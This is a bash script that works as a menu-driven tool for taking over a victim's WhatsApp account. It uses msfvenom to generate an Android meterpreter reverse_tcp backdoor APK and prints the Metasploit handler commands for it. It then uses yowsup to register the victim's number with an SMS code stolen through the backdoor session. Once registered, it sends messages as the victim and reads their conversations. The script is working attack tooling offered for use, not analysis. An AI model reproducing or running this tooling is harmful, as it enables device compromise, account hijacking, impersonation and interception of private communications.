#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

if [ "$(id -u)" = "0" ]; then
	sleep 2
	clear
	echo -e -n "$blueColour-> Apakah Kamu Ingin install FatRat Untuk BackDoor creation?$endColour$redColour <Y/N>$endColour: "
	read answer
	echo " "

	if [ "$answer" = "Y" ]; then
		cd
		git clone https://github.com/Screetsec/TheFatRat
		echo -e "$blueColour\n->Cloned repository correctly...$endColour"
		echo -e "$blueColour\n-> To install the necessary tools apply:$endColour"
		echo -e "\nchmod +x setup.h && chmod +x fatrat && chmod +x powerfull.sh && ./setup.sh"
		read answer
	fi

	echo -e -n "$blueColour->  Apakah Kamu Ingin install the Yowsup library?$endColour$redColour <Y/N>$endColour: "
	read answer
	echo " "

	if [ "$answer" = "Y" ]; then
		cd
		git clone https://github.com/tgalal/yowsup
		echo " "
	fi

	echo -e "$blueColour-> Loading Menu...$endColour"
	sleep 3

	while true
		do
			clear
			echo -e "$yellowColour __      _(_)___ _ __  _   __$endColour"
			sleep 0.4
			echo -e "$yellowColour \ \ /\ / / / __| '_ \| | | |$endColour"
			sleep 0.4
			echo -e "$yellowColour  \ V  V /| \__ \ | | | |_| |$endColour"
			sleep 0.4
			echo -e "$yellowColour   \_/\_/ |_|___/_| |_|\__,_|$endColour"
			sleep 0.8
			echo -e "$blueColour ----------------------------------------------------------------$endColour"
			echo -e "$yellowColour 1. Create a BackDoor$endColour"
			echo -e "$yellowColour 2. Get WhatsApp$endColour"
			echo -e "$yellowColour 3. Send Message From Victim's WhatsApp$endColour"
			echo -e "$yellowColour 4. Siniffing Conversations WhatsApp$endColour"
			echo -e "$yellowColour 5. Delete 'whatsapp_config.txt' actual"
			echo -e "$redColour 0. Salir$endColour"
			echo -e "$blueColour ----------------------------------------------------------------$endColour"
			echo -e -n "$redColour-> Pilih Nomer: $endColour"
			read answer

			if [ "$answer" = "1" ]; then
				echo -e -n "\n$yellowColour-> Host: $endColour"
				read ip
				echo -e -n "\n$yellowColour-> Port: $endColour"
				read port
				echo -e -n "\n$yellowColour-> Name of the Program: $endColour"
				read program_name
				echo " "

				sudo msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port R > ~/Desktop/$program_name.apk

				echo -e "$blueColourSuccessfully created program on the Desktop$endColour"
				echo -e "$yellowColour\nNow from metasploit apply the following commands:$endColour"
				echo -e "$grayColour\n- use exploit/multi/handler$endColour"
				echo -e "$grayColour- set payload android/meterpreter/reverse_tcp$endColour"
				echo -e "$grayColour- set lhost $ip$endColour"
				echo -e "$grayColour- set lport $port$endColour"
				echo -e "$grayColour- exploit$endColour"
				echo -e "$redColour\nPress <Enter> to continue...$endColour"
				read

			elif [ "$answer" = "2" ]; then
				echo -e -n "\n$yellowColour->International Prefix/Area Code (ej: 34):$endColour "
				read cc
				echo -e -n "\n-$yellowColour> NPhone Number (ej: 682213452):$endColour "
				read phone
				echo -e -n "\n$yellowColour-> Select the option that matches the phone number:$endColour\n"
				sleep 2
				echo " "
				echo -e "$redColour.1.$endColour$blueColour  Operator: Vodafone Spain | Brand: Vodafone$endColour"
				echo -e "$redColour.2.$endColour$blueColour  Operator: France Telecom Spain SA | Brand: Orange$endColour"
				echo -e "$redColour.3.$endColour$blueColour  Operator: Xfera Moviles SA | Brand: Yoigo$endColour"
				echo -e "$redColour.4.$endColour$blueColour  Operator: Telefónica Móviles Spain | Brand: Movistar$endColour"
				echo -e "$redColour.5.$endColour$blueColour  Operator: Vodafone Spain | Brand: Vodafone$endColour"
				echo -e "$redColour.6.$endColour$blueColour  Operator: -- | Brand: Euskatel$endColour"
				echo -e "$redColour.7.$endColour$blueColour  Operator: France Telecom Spain SA | Brand: Orange$endColour"
				echo -e "$redColour.8.$endColour$blueColour  Operator: -- | Brand: Operadora de Telecomunicaciones Opera SL$endColour"
				echo -e "$redColour.9.$endColour$blueColour  Operator: France Telecom Spain SA | Brand: Orange$endColour"
				echo -e "$redColour.10.$endColour$blueColour Operator: BT Group Spain Comapía de Servicios | Brand: BT$endColour"
				echo -e "$redColour.11.$endColour$blueColour Operator: Telecable de Asturias S.A.U. | Brand: TeleCable$endColour"
				echo -e "$redColour.12.$endColour$blueColour Operator: Móbil R | Brand: R Cable y Telecomunicaciones Galicia S.A. SL$endColour"
				echo -e "$redColour.13.$endColour$blueColour Operator: Cableuropa S.A.U. | Brand: ONO$endColour"
				echo -e "$redColour.14.$endColour$blueColour Operator: Orange S.A. | Brand: Jazztel$endColour"
				echo " "
				echo -e -n "$yellowColour>$endColour "
				read option

				if [ "$option" = "1" ]; then
					mcc=214
					mnc=01
				elif [ "$option" = "2" ]; then
					mcc=214
					mnc=03
				elif [ "$option" = "3" ]; then
					mcc=214
					mnc=04
				elif [ "$option" = "4" ]; then
					mcc=214
					mnc=05
				elif [ "$option" = "5" ]; then
					mcc=214
					mnc=06
				elif [ "$option" = "6" ]; then
					mcc=214
					mnc=08
				elif [ "$option" = "7" ]; then
					mcc=214
					mnc=09
				elif [ "$option" = "8" ]; then
					mcc=214
					mnc=10
				elif [ "$option" = "9" ]; then
					mcc=214
					mnc=11
				elif [ "$option" = "10" ]; then
					mcc=214
					mnc=15
				elif [ "$option" = "11" ]; then
					mcc=214
					mnc=16
				elif [ "$option" = "12" ]; then
					mcc=214
					mnc=17
				elif [ "$option" = "13" ]; then
					mcc=214
					mnc=18
				elif [ "$option" = "14" ]; then
					mcc=214
					mnc=21
				fi

				echo -e "$yellowColour\n-> Recorded values cc=$cc | mcc=$mcc | mnc=$mnc | phone=$phone$endColour"
				sleep 3
				echo -e "$yellowColour\n-> Sending WhatsApp registration code...$endColour"
				echo " "
				sleep 3

				sudo yowsup-cli registration --requestcode sms --phone $cc$phone --cc $cc --mcc $mcc --mnc $mnc -E android

				echo -e -n "\n$yellowColour-> From metasploit apply the command dump_sms once the session is obtained | Code (ej: 465-798):$endColour "
				read registration_code
				echo " "
				echo -e "$yellowColour-> Performing registration...$endColour\n"
				sleep 2

				sudo yowsup-cli registration --register $registration_code --phone $cc$phone --cc $cc

				echo -e -n "\n$yellowColour-> Enter the generated password:$endColour "
				read password

				echo -e -n "\n$yellowColour-> WhatsApp Session Details:$endColour\n"
				echo " "
				echo -e "$blueColour-------------------------------------$endColour"
				echo -e "$yellowColour cc=$cc$endColour"
				echo -e "$yellowColour phone=$phone"
				echo -e "$yellowColour password=$password"
				echo -e "$blueColour-------------------------------------$endColour"
				echo "cc=$cc" >> whatsapp_config.txt
				echo "phone=$cc$phone" >> whatsapp_config.txt
				echo "password=$password" >> whatsapp_config.txt
				echo -e "$blueColour\nThe file has been generated 'whatsapp_config.txt in the current directory$endColour"
				echo -e "$redColour\nPress <Enter> to continue...$endColour"
				read

			elif [ "$answer" = "3" ]; then
				echo -e -n "\n$yellowColour-> International Prefix/Area Code (To whom we want to send the message):$endColour "
				read prefix_send
				echo -e -n "\n$yellowColour-> Phone Number (To whom we want to send the message):$endColour "
				read number_send
				echo -e -n "\n$yellowColour-> Message to be sent:$endColour "
				read -e message
				echo " "

				sudo yowsup-cli demos --config whatsapp_config.txt --send $prefix_send$number_send "$message"

				echo -e "$redColour\nPress <Enter> to continue...$endColour"
				read	

			elif [ "$answer" = "4" ]; then
				echo -e "\n$blueColour-> Sniffing Conversations...$endColour\n"

				sudo yowsup-cli demos --config whatsapp_config.txt --echo

			elif [ "$answer" = "5" ]; then
				sudo rm -r whatsapp_config.txt

			elif [ "$answer" = "0" ]; then
				echo " "
				break
			fi
	done

else
	echo -e "\n$redColour-> Perangkat Anda Harus Keadaan Root$endColour\n"
fi
